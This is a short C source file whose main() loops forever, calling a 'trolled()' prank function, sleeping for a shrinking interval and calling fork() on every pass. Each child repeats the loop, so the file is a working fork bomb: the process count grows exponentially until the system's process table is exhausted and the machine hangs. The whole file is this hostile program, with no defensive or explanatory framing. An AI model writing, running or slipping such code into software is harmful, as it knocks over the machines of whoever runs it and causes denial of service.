/*
 * main.c
 *
 *  Created on: Nov 9, 2022
 *      Author: blair
 */

#include "functions.h"
#include <unistd.h>

int main(void) {
	int countdown = 6;
	while (1) {
		trolled();
		sleep(countdown);
		fork();
		if (countdown > 1) countdown--;
	}
}
